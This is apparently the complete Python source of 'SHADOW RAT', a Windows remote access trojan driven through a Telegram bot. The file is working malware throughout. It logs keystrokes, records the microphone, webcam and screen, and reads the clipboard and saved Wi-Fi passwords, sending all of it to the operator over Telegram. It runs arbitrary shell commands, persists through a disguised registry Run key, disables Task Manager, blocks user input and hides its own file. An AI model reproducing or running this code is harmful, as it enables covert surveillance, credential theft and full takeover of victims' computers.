
# Developer: Sreeraj
# GitHub: https://github.com/s-r-e-e-r-a-j

import telebot
import os
import random
import pyttsx3
import pyautogui
import cv2
import ctypes
import time
import platform
import requests
import threading
import subprocess
import wave
import pyaudio
import numpy as np
from pynput import keyboard

BOT_TOKEN: str = 'YOUR_BOT_TOKEN_HERE'
PASSWORD: str = '1234567B'
AUTH_USERS: set[int] = set()
current_directory: str = os.getcwd()
execute_mode: bool = False
waiting_for_upload: bool = False
keylogger_active: bool = False
keylog_listener = None
keylog_buffer: list[str] = []
mouse_mess_active: bool = False
execute_session: bool = False

bot = telebot.TeleBot(BOT_TOKEN)

def authenticated(func: callable) -> callable:
    def wrapper(message: telebot.types.Message) -> None:
        if message.from_user.id not in AUTH_USERS:
            bot.send_message(message.chat.id, "Send /start first")
            return
        func(message)
    return wrapper

def on_key_press(key):
    global keylog_buffer, keylogger_active
    if not keylogger_active:
        return
    
    try:
        if hasattr(key, 'char') and key.char is not None:
            keylog_buffer.append(key.char)
        else:
            keylog_buffer.append(f'[{key.name}]' if hasattr(key, 'name') else str(key))
    except:
        keylog_buffer.append(f'[{key}]')
    
    if len(keylog_buffer) >= 100:
        flush_keylogs()

def flush_keylogs():
    global keylog_buffer
    if keylog_buffer:
        with open('keylog.txt', 'a', encoding='utf-8') as f:
            f.write(''.join(keylog_buffer))
        keylog_buffer = []

def start_keylogger():
    global keylogger_active, keylog_listener
    keylogger_active = True
    keylog_listener = keyboard.Listener(on_press=on_key_press)
    keylog_listener.start()

def stop_keylogger():
    global keylogger_active
    keylogger_active = False
    if keylog_listener:
        keylog_listener.stop()
    flush_keylogs()

@bot.message_handler(commands=['start'])
def start_handler(message: telebot.types.Message) -> None:
    bot.send_message(message.chat.id, "Password:")
    bot.register_next_step_handler(message, verify_password)

def verify_password(message: telebot.types.Message) -> None:
    if message.text == PASSWORD:
        AUTH_USERS.add(message.from_user.id)
        bot.send_message(message.chat.id, "SHADOW RAT Activated")
        bot.send_message(message.chat.id, f"Connected - {os.popen('whoami').read().strip()}")
        bot.send_message(message.chat.id, "Use /help")
    else:
        bot.send_message(message.chat.id, "Wrong password")

@bot.message_handler(commands=['help'])
@authenticated
def help_command(message: telebot.types.Message) -> None:
    help_text: str = """/start - Connect
/help - This menu
/addstartup - Add to autostart
/deletestartup - Remove from autostart
/run [path] - Run file
/users - Show PC users
/whoami - Show username
/tasklist - Show processes
/taskkill [name] - Kill process
/sleep - Sleep mode
/shutdown - Shutdown
/restart - Restart
/altf4 - Alt+F4
/cmdbomb - Open 10 CMDs
/msg [type] [title] [text] - MessageBox
/wallpaper - Change wallpaper
/disabletaskmgr - Disable Task Manager
/enabletaskmgr - Enable Task Manager
/screenshot - Take screenshot
/mic [sec] - Record mic
/webscreen - Webcam photo
/webcam [sec] - Webcam video
/screenrecord [sec] - Record screen
/block - Block input
/unblock - Unblock input
/keylogstart - Start keylogger
/keylogstop - Stop keylogger
/keylogdump - Download keylogs
/mousemesstart - Mouse mess
/mousemesstop - Stop mouse mess
/mousemove x y - Move mouse
/mouseclick - Left click
/mouseright - Right click
/fullvolume - Max volume
/volumeplus - Volume +10
/volumeminus - Volume -10
/maximize - Maximize window
/minimize - Minimize window
/wifilist - Show Wi-Fi networks
/wifipass [name] - Show Wi-Fi password
/chrome [url] - Open in Chrome
/edge [url] - Open in Edge
/firefox [url] - Open in Firefox
/textspeech [text] - Speak text
/playsound [path] - Play sound
/download [path] - Download file
/upload - Upload file
/clipboard - Show clipboard
/changeclipboard [text] - Change clipboard
/e [cmd] - Execute command
/ex [cmd] - Execute with long output
/execute - Interactive shell
/metadata [path] - File metadata
/keytype [text] - Type text
/keypress [key] - Press key
/keypresstwo k1 k2 - Press two keys
/keypressthree k1 k2 k3 - Press three keys
/hide - Hide script
/unhide - Unhide script
/info - IP and location
/pcinfo - System info
/shortinfo - Basic info
/apps - Installed apps
/batteryinfo - Battery info"""
    bot.send_message(message.chat.id, help_text)

@bot.message_handler(commands=['keylogstart'])
@authenticated
def keylog_start(message: telebot.types.Message) -> None:
    global keylogger_active
    if not keylogger_active:
        start_keylogger()
        bot.send_message(message.chat.id, "Keylogger started")
    else:
        bot.send_message(message.chat.id, "Keylogger already running")

@bot.message_handler(commands=['keylogstop'])
@authenticated
def keylog_stop(message: telebot.types.Message) -> None:
    global keylogger_active
    if keylogger_active:
        stop_keylogger()
        bot.send_message(message.chat.id, "Keylogger stopped")
    else:
        bot.send_message(message.chat.id, "Keylogger not running")

@bot.message_handler(commands=['keylogdump'])
@authenticated
def keylog_dump(message: telebot.types.Message) -> None:
    flush_keylogs()
    if os.path.exists('keylog.txt'):
        with open('keylog.txt', 'rb') as f:
            bot.send_document(message.chat.id, f)
    else:
        bot.send_message(message.chat.id, "No keylogs found")

@bot.message_handler(commands=['addstartup'])
@authenticated
def add_startup(message: telebot.types.Message) -> None:
    bot.send_message(message.chat.id, "Send full exe path:")
    bot.register_next_step_handler(message, save_startup_path)

def save_startup_path(message: telebot.types.Message) -> None:
    key_name: str = "WindowsHelper"
    os.system(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{key_name}" /t REG_SZ /d "{message.text}" /f')
    bot.send_message(message.chat.id, "Added to startup")

@bot.message_handler(commands=['deletestartup'])
@authenticated
def delete_startup(message: telebot.types.Message) -> None:
    key_name: str = "WindowsHelper"
    os.system(f'reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "{key_name}" /f')
    bot.send_message(message.chat.id, "Removed from startup")

@bot.message_handler(commands=['run'])
@authenticated
def run_file(message: telebot.types.Message) -> None:
    path: str = message.text.split('/run', 1)[1].strip()
    os.startfile(path)
    bot.send_message(message.chat.id, "File executed")

@bot.message_handler(commands=['whoami'])
@authenticated
def whoami_command(message: telebot.types.Message) -> None:
    result: str = os.popen('whoami').read().strip()
    bot.send_message(message.chat.id, f"User: {result}")

@bot.message_handler(commands=['users'])
@authenticated
def users_command(message: telebot.types.Message) -> None:
    result: str = os.popen('net user').read().strip()
    bot.send_message(message.chat.id, f"Users:\n{result[:4000]}")

@bot.message_handler(commands=['tasklist'])
@authenticated
def tasklist_command(message: telebot.types.Message) -> None:
    result: str = os.popen('tasklist').read().strip()
    chunks: list[str] = [result[i:i+4000] for i in range(0, len(result), 4000)]
    for chunk in chunks:
        bot.send_message(message.chat.id, f"Processes:\n{chunk}")

@bot.message_handler(commands=['taskkill'])
@authenticated
def taskkill_command(message: telebot.types.Message) -> None:
    task: str = message.text.split('/taskkill', 1)[1].strip()
    result: str = os.popen(f'taskkill /f /im {task}').read().strip()
    bot.send_message(message.chat.id, result)

@bot.message_handler(commands=['shutdown'])
@authenticated
def shutdown_command(message: telebot.types.Message) -> None:
    os.system('shutdown /s /f /t 0')
    bot.send_message(message.chat.id, "Shutting down")

@bot.message_handler(commands=['restart'])
@authenticated
def restart_command(message: telebot.types.Message) -> None:
    os.system('shutdown /r /f /t 0')
    bot.send_message(message.chat.id, "Restarting")

@bot.message_handler(commands=['sleep'])
@authenticated
def sleep_command(message: telebot.types.Message) -> None:
    ctypes.windll.PowrProf.SetSuspendState(0, 1, 0)
    bot.send_message(message.chat.id, "Sleep mode")

@bot.message_handler(commands=['altf4'])
@authenticated
def altf4_command(message: telebot.types.Message) -> None:
    pyautogui.hotkey('alt', 'f4')
    bot.send_message(message.chat.id, "Alt+F4 pressed")

@bot.message_handler(commands=['cmdbomb'])
@authenticated
def cmdbomb_command(message: telebot.types.Message) -> None:
    for _ in range(10):
        os.system('start cmd')
    bot.send_message(message.chat.id, "Opened 10 CMD windows")

@bot.message_handler(commands=['msg'])
@authenticated
def msg_command(message: telebot.types.Message) -> None:
    parts: list[str] = message.text.split('/msg', 1)[1].strip().split()
    msg_type: str = parts[0]
    title: str = parts[1]
    text: str = ' '.join(parts[2:])
    types_map: dict[str, int] = {"info": 64, "warning": 48, "error": 16, "question": 32, "default": 0}
    code: int = types_map.get(msg_type, 0)
    os.system(f'mshta vbscript:Execute("msgbox ""{text}"", {code}, ""{title}"":close")')
    bot.send_message(message.chat.id, "Message displayed")

@bot.message_handler(commands=['wallpaper'])
@authenticated
def wallpaper_command(message: telebot.types.Message) -> None:
    bot.send_message(message.chat.id, "First use /upload to send image, then send filename:")
    bot.register_next_step_handler(message, set_wallpaper)

def set_wallpaper(message: telebot.types.Message) -> None:
    ctypes.windll.user32.SystemParametersInfoW(20, 0, os.path.abspath(message.text), 0)
    bot.send_message(message.chat.id, "Wallpaper changed")

@bot.message_handler(commands=['disabletaskmgr'])
@authenticated
def disable_taskmgr(message: telebot.types.Message) -> None:
    os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f')
    bot.send_message(message.chat.id, "Task Manager disabled")

@bot.message_handler(commands=['enabletaskmgr'])
@authenticated
def enable_taskmgr(message: telebot.types.Message) -> None:
    os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /t REG_DWORD /d 0 /f')
    bot.send_message(message.chat.id, "Task Manager enabled")

@bot.message_handler(commands=['screenshot'])
@authenticated
def screenshot_command(message: telebot.types.Message) -> None:
    path: str = "temp_screenshot.png"
    pyautogui.screenshot(path)
    with open(path, 'rb') as img:
        bot.send_photo(message.chat.id, img)
    os.remove(path)

@bot.message_handler(commands=['mic'])
@authenticated
def mic_command(message: telebot.types.Message) -> None:
    duration: int = int(message.text.split()[1]) if len(message.text.split()) > 1 else 5
    chunk: int = 1024
    format_type: int = pyaudio.paInt16
    channels: int = 2
    rate: int = 44100
    output: str = "temp_audio.wav"
    p = pyaudio.PyAudio()
    stream = p.open(format=format_type, channels=channels, rate=rate, input=True, frames_per_buffer=chunk)
    frames: list[bytes] = []
    for _ in range(0, int(rate / chunk * duration)):
        frames.append(stream.read(chunk))
    stream.stop_stream()
    stream.close()
    p.terminate()
    with wave.open(output, 'wb') as wf:
        wf.setnchannels(channels)
        wf.setsampwidth(p.get_sample_size(format_type))
        wf.setframerate(rate)
        wf.writeframes(b''.join(frames))
    with open(output, 'rb') as audio:
        bot.send_audio(message.chat.id, audio)
    os.remove(output)

@bot.message_handler(commands=['webscreen'])
@authenticated
def webscreen_command(message: telebot.types.Message) -> None:
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    if ret:
        path: str = "temp_webcam.jpg"
        cv2.imwrite(path, frame)
        with open(path, 'rb') as img:
            bot.send_photo(message.chat.id, img)
        os.remove(path)
    cap.release()

@bot.message_handler(commands=['webcam'])
@authenticated
def webcam_command(message: telebot.types.Message) -> None:
    duration: int = int(message.text.split()[1]) if len(message.text.split()) > 1 else 5
    cap = cv2.VideoCapture(0)
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    output: str = "temp_video.avi"
    out = cv2.VideoWriter(output, fourcc, 20.0, (640, 480))
    start: float = time.time()
    while time.time() - start < duration:
        ret, frame = cap.read()
        if ret:
            out.write(frame)
    cap.release()
    out.release()
    with open(output, 'rb') as video:
        bot.send_video(message.chat.id, video)
    os.remove(output)

@bot.message_handler(commands=['screenrecord'])
@authenticated
def screenrecord_command(message: telebot.types.Message) -> None:
    duration: int = int(message.text.split()[1]) if len(message.text.split()) > 1 else 10
    width, height = pyautogui.size()
    fourcc = cv2.VideoWriter_fourcc(*'XVID')
    output: str = "temp_record.avi"
    out = cv2.VideoWriter(output, fourcc, 10.0, (width, height))
    start: float = time.time()
    while time.time() - start < duration:
        img = pyautogui.screenshot()
        frame = np.array(img)
        frame = cv2.cvtColor(frame, cv2.COLOR_RGB2BGR)
        out.write(frame)
    out.release()
    with open(output, 'rb') as video:
        bot.send_video(message.chat.id, video)
    os.remove(output)

@bot.message_handler(commands=['block'])
@authenticated
def block_input(message: telebot.types.Message) -> None:
    ctypes.windll.user32.BlockInput(True)
    bot.send_message(message.chat.id, "Input blocked")

@bot.message_handler(commands=['unblock'])
@authenticated
def unblock_input(message: telebot.types.Message) -> None:
    ctypes.windll.user32.BlockInput(False)
    bot.send_message(message.chat.id, "Input unblocked")

def mouse_mess_loop() -> None:
    global mouse_mess_active
    while mouse_mess_active:
        x: int = random.randint(100, 1000)
        y: int = random.randint(100, 800)
        pyautogui.moveTo(x, y, 0.5)
        time.sleep(1)

@bot.message_handler(commands=['mousemesstart'])
@authenticated
def mousemes_start(message: telebot.types.Message) -> None:
    global mouse_mess_active
    mouse_mess_active = True
    threading.Thread(target=mouse_mess_loop, daemon=True).start()
    bot.send_message(message.chat.id, "Mouse mess started")

@bot.message_handler(commands=['mousemesstop'])
@authenticated
def mousemes_stop(message: telebot.types.Message) -> None:
    global mouse_mess_active
    mouse_mess_active = False
    bot.send_message(message.chat.id, "Mouse mess stopped")

@bot.message_handler(commands=['mousemove'])
@authenticated
def mousemove_command(message: telebot.types.Message) -> None:
    coords: list[str] = message.text.split('/mousemove', 1)[1].strip().split()
    x: int = int(coords[0])
    y: int = int(coords[1])
    pyautogui.moveTo(x, y)
    bot.send_message(message.chat.id, f"Moved to ({x}, {y})")

@bot.message_handler(commands=['mouseclick'])
@authenticated
def mouseclick_command(message: telebot.types.Message) -> None:
    pyautogui.click()
    bot.send_message(message.chat.id, "Left clicked")

@bot.message_handler(commands=['mouseright'])
@authenticated
def mouseright_command(message: telebot.types.Message) -> None:
    pyautogui.rightClick()
    bot.send_message(message.chat.id, "Right clicked")

@bot.message_handler(commands=['fullvolume'])
@authenticated
def fullvolume_command(message: telebot.types.Message) -> None:
    for _ in range(50):
        pyautogui.press('volumeup')
    bot.send_message(message.chat.id, "Max volume")

@bot.message_handler(commands=['volumeplus'])
@authenticated
def volumeplus_command(message: telebot.types.Message) -> None:
    for _ in range(5):
        pyautogui.press('volumeup')
    bot.send_message(message.chat.id, "Volume +10%")

@bot.message_handler(commands=['volumeminus'])
@authenticated
def volumeminus_command(message: telebot.types.Message) -> None:
    for _ in range(5):
        pyautogui.press('volumedown')
    bot.send_message(message.chat.id, "Volume -10%")

@bot.message_handler(commands=['maximize'])
@authenticated
def maximize_command(message: telebot.types.Message) -> None:
    pyautogui.hotkey('win', 'up')
    bot.send_message(message.chat.id, "Window maximized")

@bot.message_handler(commands=['minimize'])
@authenticated
def minimize_command(message: telebot.types.Message) -> None:
    pyautogui.hotkey('win', 'down')
    bot.send_message(message.chat.id, "Window minimized")

@bot.message_handler(commands=['wifilist'])
@authenticated
def wifilist_command(message: telebot.types.Message) -> None:
    result: str = os.popen('netsh wlan show profile').read().strip()
    bot.send_message(message.chat.id, f"Wi-Fi networks:\n{result[:4000]}")

@bot.message_handler(commands=['wifipass'])
@authenticated
def wifipass_command(message: telebot.types.Message) -> None:
    name: str = message.text.split('/wifipass', 1)[1].strip()
    result: str = os.popen(f'netsh wlan show profile name="{name}" key=clear').read().strip()
    bot.send_message(message.chat.id, result[:4000])

@bot.message_handler(commands=['chrome'])
@authenticated
def chrome_command(message: telebot.types.Message) -> None:
    url: str = message.text.split('/chrome', 1)[1].strip()
    os.system(f'start chrome "{url}"')
    bot.send_message(message.chat.id, f"Opened {url} in Chrome")

@bot.message_handler(commands=['edge'])
@authenticated
def edge_command(message: telebot.types.Message) -> None:
    url: str = message.text.split('/edge', 1)[1].strip()
    os.system(f'start msedge "{url}"')
    bot.send_message(message.chat.id, f"Opened {url} in Edge")

@bot.message_handler(commands=['firefox'])
@authenticated
def firefox_command(message: telebot.types.Message) -> None:
    url: str = message.text.split('/firefox', 1)[1].strip()
    os.system(f'start firefox "{url}"')
    bot.send_message(message.chat.id, f"Opened {url} in Firefox")

@bot.message_handler(commands=['textspeech'])
@authenticated
def textspeech_command(message: telebot.types.Message) -> None:
    text: str = message.text.split('/textspeech', 1)[1].strip()
    engine = pyttsx3.init()
    engine.say(text)
    engine.runAndWait()
    bot.send_message(message.chat.id, "Speaking completed")

@bot.message_handler(commands=['playsound'])
@authenticated
def playsound_command(message: telebot.types.Message) -> None:
    path: str = message.text.split('/playsound', 1)[1].strip()
    os.startfile(path)
    bot.send_message(message.chat.id, "Playing sound")

@bot.message_handler(commands=['download'])
@authenticated
def download_command(message: telebot.types.Message) -> None:
    path: str = message.text.split('/download', 1)[1].strip()
    with open(path, 'rb') as file:
        if path.endswith(('.png', '.jpg', '.jpeg', '.gif')):
            bot.send_photo(message.chat.id, file)
        elif path.endswith(('.mp4', '.avi', '.mkv')):
            bot.send_video(message.chat.id, file)
        else:
            bot.send_document(message.chat.id, file)

@bot.message_handler(commands=['upload'])
@authenticated
def upload_command(message: telebot.types.Message) -> None:
    global waiting_for_upload
    waiting_for_upload = True
    bot.send_message(message.chat.id, "Send your file:")

@bot.message_handler(content_types=['document', 'photo', 'video', 'audio'])
@authenticated
def handle_upload(message):
    global waiting_for_upload
    if waiting_for_upload:
        try:
            if message.document:
                file_info = bot.get_file(message.document.file_id)
                file_name = message.document.file_name
            elif message.photo:
                file_info = bot.get_file(message.photo[-1].file_id)
                file_name = f"photo_{int(time.time())}.jpg"
            else:
                bot.send_message(message.chat.id, "Send document or photo")
                waiting_for_upload = False
                return
                
            downloaded = bot.download_file(file_info.file_path)
            with open(file_name, 'wb') as f:
                f.write(downloaded)
            bot.send_message(message.chat.id, f"Saved: {file_name}")
        except Exception as e:
            bot.send_message(message.chat.id, f"Error: {e}")
        finally:
            waiting_for_upload = False

@bot.message_handler(commands=['clipboard'])
@authenticated
def clipboard_command(message: telebot.types.Message) -> None:
    try:
        result = subprocess.run(['powershell.exe', '-Command', 'Get-Clipboard'], 
                              capture_output=True, text=True, timeout=5)
        if result.stdout and result.stdout.strip():
            bot.send_message(message.chat.id, f"Clipboard: {result.stdout.strip()[:4000]}")
            return
    except:
        pass

    try:
        user32 = ctypes.windll.user32
        kernel32 = ctypes.windll.kernel32
        user32.OpenClipboard(0)
        if user32.IsClipboardFormatAvailable(1):
            data = user32.GetClipboardData(1)
            if data:
                locked = kernel32.GlobalLock(data)
                if locked:
                    text = ctypes.c_char_p(locked).value
                    if text:
                        clipboard_text = text.decode('utf-8', errors='ignore')
                        kernel32.GlobalUnlock(locked)
                        user32.CloseClipboard()
                        bot.send_message(message.chat.id, f"Clipboard: {clipboard_text[:4000]}")
                        return
            if locked:
                kernel32.GlobalUnlock(locked)
        user32.CloseClipboard()
        bot.send_message(message.chat.id, "Clipboard empty or contains non-text data")
    except Exception as e:
        bot.send_message(message.chat.id, f"Could not read clipboard: {str(e)}")

@bot.message_handler(commands=['changeclipboard'])
@authenticated
def changeclipboard_command(message: telebot.types.Message) -> None:
    text: str = message.text.split('/changeclipboard', 1)[1].strip()
    os.system(f'echo {text} | clip')
    bot.send_message(message.chat.id, f"Clipboard set to: {text}")

@bot.message_handler(commands=['e'])
@authenticated
def e_command(message: telebot.types.Message) -> None:
    global current_directory
    cmd: str = message.text.split('/e', 1)[1].strip()
    if cmd == 'cd..':
        current_directory = os.path.dirname(current_directory)
        os.chdir(current_directory)
        bot.send_message(message.chat.id, f"Now in: {current_directory}")
    elif cmd.startswith('cd '):
        new_dir: str = cmd.split(' ', 1)[1].strip()
        os.chdir(new_dir)
        current_directory = os.getcwd()
        bot.send_message(message.chat.id, f"Now in: {current_directory}")
    else:
        result: str = os.popen(cmd).read()
        bot.send_message(message.chat.id, result[:4000])

@bot.message_handler(commands=['ex'])
@authenticated
def ex_command(message: telebot.types.Message) -> None:
    cmd: str = message.text.split('/ex', 1)[1].strip()
    result: str = os.popen(cmd).read()
    chunks: list[str] = [result[i:i+4000] for i in range(0, len(result), 4000)]
    if len(chunks) > 1:
        with open('output.txt', 'w', encoding='utf-8') as f:
            f.write(result)
        with open('output.txt', 'rb') as f:
            bot.send_document(message.chat.id, f)
        os.remove('output.txt')
    else:
        bot.send_message(message.chat.id, result[:4000])

@bot.message_handler(commands=['execute'])
@authenticated
def execute_command(message: telebot.types.Message) -> None:
    global execute_session
    execute_session = True
    bot.send_message(message.chat.id, "Interactive shell. Type 'exit' to quit.")

@bot.message_handler(func=lambda m: execute_session and m.chat.id in AUTH_USERS)
def execute_shell(message: telebot.types.Message) -> None:
    global execute_session, current_directory
    cmd: str = message.text.strip()
    if cmd.lower() == 'exit':
        execute_session = False
        bot.send_message(message.chat.id, "Exited shell")
    elif cmd == 'cd..':
        current_directory = os.path.dirname(current_directory)
        os.chdir(current_directory)
        bot.send_message(message.chat.id, f"Now in: {current_directory}")
    elif cmd.startswith('cd '):
        new_dir: str = cmd.split(' ', 1)[1].strip()
        try:
            os.chdir(new_dir)
            current_directory = os.getcwd()
            bot.send_message(message.chat.id, f"Now in: {current_directory}")
        except Exception as e:
            bot.send_message(message.chat.id, f"Error: {e}")
    else:
        result: str = os.popen(cmd).read()
        bot.send_message(message.chat.id, result[:4000] if result else "Command executed")

@bot.message_handler(commands=['metadata'])
@authenticated
def metadata_command(message: telebot.types.Message) -> None:
    path: str = message.text.split('/metadata', 1)[1].strip()
    if os.path.exists(path):
        stat_info = os.stat(path)
        info: str = f"Size: {stat_info.st_size} bytes\nModified: {time.ctime(stat_info.st_mtime)}\nCreated: {time.ctime(stat_info.st_ctime)}"
        bot.send_message(message.chat.id, info)
    else:
        bot.send_message(message.chat.id, "File not found")

@bot.message_handler(commands=['keytype'])
@authenticated
def keytype_command(message: telebot.types.Message) -> None:
    text: str = message.text.split('/keytype', 1)[1].strip()
    pyautogui.write(text)
    bot.send_message(message.chat.id, f"Typed: {text}")

@bot.message_handler(commands=['keypress'])
@authenticated
def keypress_command(message: telebot.types.Message) -> None:
    key: str = message.text.split('/keypress', 1)[1].strip()
    pyautogui.press(key)
    bot.send_message(message.chat.id, f"Pressed: {key}")

@bot.message_handler(commands=['keypresstwo'])
@authenticated
def keypresstwo_command(message: telebot.types.Message) -> None:
    keys: list[str] = message.text.split('/keypresstwo', 1)[1].strip().split()
    pyautogui.hotkey(keys[0], keys[1])
    bot.send_message(message.chat.id, f"Pressed {keys[0]}+{keys[1]}")

@bot.message_handler(commands=['keypressthree'])
@authenticated
def keypressthree_command(message: telebot.types.Message) -> None:
    keys: list[str] = message.text.split('/keypressthree', 1)[1].strip().split()
    pyautogui.hotkey(keys[0], keys[1], keys[2])
    bot.send_message(message.chat.id, f"Pressed {keys[0]}+{keys[1]}+{keys[2]}")

@bot.message_handler(commands=['hide'])
@authenticated
def hide_command(message: telebot.types.Message) -> None:
    script_path: str = os.path.abspath(__file__)
    os.system(f'attrib +h "{script_path}"')
    bot.send_message(message.chat.id, "Script hidden")

@bot.message_handler(commands=['unhide'])
@authenticated
def unhide_command(message: telebot.types.Message) -> None:
    script_path: str = os.path.abspath(__file__)
    os.system(f'attrib -h "{script_path}"')
    bot.send_message(message.chat.id, "Script unhidden")

@bot.message_handler(commands=['info'])
@authenticated
def info_command(message: telebot.types.Message) -> None:
    try:
        ip: str = requests.get('https://api.ipify.org', timeout=5).text
        geo: dict = requests.get(f'http://ip-api.com/json/{ip}', timeout=5).json()
        info_text: str = f"IP: {ip}\nCity: {geo.get('city', 'N/A')}\nRegion: {geo.get('regionName', 'N/A')}\nCountry: {geo.get('country', 'N/A')}\nISP: {geo.get('isp', 'N/A')}"
        bot.send_message(message.chat.id, info_text)
    except:
        bot.send_message(message.chat.id, "Could not fetch location info")

@bot.message_handler(commands=['pcinfo'])
@authenticated
def pcinfo_command(message: telebot.types.Message) -> None:
    try:
        ps_script = """
        $computer = Get-CimInstance Win32_ComputerSystem
        $os = Get-CimInstance Win32_OperatingSystem
        $cpu = Get-CimInstance Win32_Processor | Select-Object -First 1
        Write-Output "$($computer.Name)|$($os.Caption)|$($cpu.Name)|$($cpu.NumberOfCores)|$($computer.TotalPhysicalMemory/1GB)"
        """
        result = subprocess.run(['powershell', '-Command', ps_script], 
                              capture_output=True, text=True, timeout=10)
        if result.stdout:
            parts = result.stdout.strip().split('|')
            info: str = f"Hostname: {parts[0]}\nOS: {parts[1]}\nCPU: {parts[2]}\nCores: {parts[3]}\nRAM: {float(parts[4]):.0f} GB"
            bot.send_message(message.chat.id, info)
            return
    except:
        pass

    hostname: str = platform.node()
    system: str = platform.system()
    release: str = platform.release()
    processor: str = platform.processor()
    cpu_count: int = os.cpu_count()
    ram_info = os.popen('wmic computersystem get TotalPhysicalMemory').read().strip().split('\n')[1].strip()
    ram_gb: int = int(int(ram_info) / (1024**3)) if ram_info.isdigit() else 0
    info: str = f"Hostname: {hostname}\nOS: {system} {release}\nCPU: {processor}\nCores: {cpu_count}\nRAM: {ram_gb} GB"
    bot.send_message(message.chat.id, info)

@bot.message_handler(commands=['shortinfo'])
@authenticated
def shortinfo_command(message: telebot.types.Message) -> None:
    user: str = os.getenv('USERNAME', 'Unknown')
    pc: str = platform.node()
    os_ver: str = platform.version()[:50]
    info: str = f"User: {user}\nPC: {pc}\nOS: {os_ver}"
    bot.send_message(message.chat.id, info)

@bot.message_handler(commands=['apps'])
@authenticated
def apps_command(message: telebot.types.Message) -> None:
    result: str = os.popen('wmic product get Name, Version').read().strip()
    chunks: list[str] = [result[i:i+4000] for i in range(0, len(result), 4000)]
    for chunk in chunks[:5]:
        bot.send_message(message.chat.id, f"Apps:\n{chunk}")

@bot.message_handler(commands=['batteryinfo'])
@authenticated
def batteryinfo_command(message: telebot.types.Message) -> None:
    try:
        percent: str = os.popen('wmic path Win32_Battery get EstimatedChargeRemaining').read().strip().split('\n')[1].strip()
        status: str = os.popen('wmic path Win32_Battery get BatteryStatus').read().strip().split('\n')[1].strip()
        status_map: dict[str, str] = {'1': 'Discharging', '2': 'Charging', '3': 'Fully Charged'}
        bot.send_message(message.chat.id, f"Battery: {percent}%\nStatus: {status_map.get(status, 'Unknown')}")
    except:
        bot.send_message(message.chat.id, "No battery found")

if __name__ == '__main__':
    bot.polling(none_stop=True)
